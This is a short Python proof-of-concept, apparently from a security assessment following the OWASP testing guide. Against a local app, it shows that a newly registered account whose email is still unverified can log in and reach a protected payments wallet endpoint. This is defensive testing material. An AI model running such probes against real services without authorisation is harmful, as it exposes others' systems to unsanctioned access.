"""
WSTG-IDNT-03: Unverified accounts can authenticate and use protected endpoints.

Demonstrates that a newly registered account is returned with email_verified=false
but still receives a valid token, can log in again normally, and can access
GET /api/payments/wallet.

Expected:
- Registration succeeds
- email_verified is false
- Login succeeds without any verification step
- /api/payments/wallet returns HTTP 200
"""

from __future__ import annotations

import time
import uuid

import requests


BASE = "http://localhost:3000"
PASSWORD = "password123"


def unique_identity() -> tuple[str, str]:
    stamp = f"{int(time.time())}_{uuid.uuid4().hex[:8]}"
    email = f"wstg_idnt03_{stamp}@proton.test"
    username = f"wstg_idnt03_{uuid.uuid4().hex[:10]}"
    return email, username


def main() -> None:
    email, username = unique_identity()

    reg = requests.post(
        f"{BASE}/api/auth/register",
        json={
            "email": email,
            "password": PASSWORD,
            "username": username,
            "display_name": "WSTG IDNT03",
        },
        timeout=10,
    )
    reg.raise_for_status()
    reg_body = reg.json()

    print(f"[+] Registered: {email}")
    print(f"[+] email_verified from register response: {reg_body['user']['email_verified']}")
    assert reg_body["user"]["email_verified"] is False, "Expected email_verified=false"

    login = requests.post(
        f"{BASE}/api/auth/login",
        json={"email": email, "password": PASSWORD},
        timeout=10,
    )
    login.raise_for_status()
    login_body = login.json()
    print("[+] Login succeeded before email verification")
    assert login_body["user"]["email_verified"] is False, "Expected still-unverified account"

    wallet = requests.get(
        f"{BASE}/api/payments/wallet",
        headers={"Authorization": f"Bearer {login_body['token']}"},
        timeout=10,
    )
    wallet.raise_for_status()
    print(f"[+] Wallet status: {wallet.status_code}")
    print(f"[+] Wallet body: {wallet.json()}")

    assert wallet.status_code == 200, "Expected access to protected endpoint"
    print("\n[VULNERABLE] Unverified accounts can authenticate and use protected functionality")


if __name__ == "__main__":
    main()
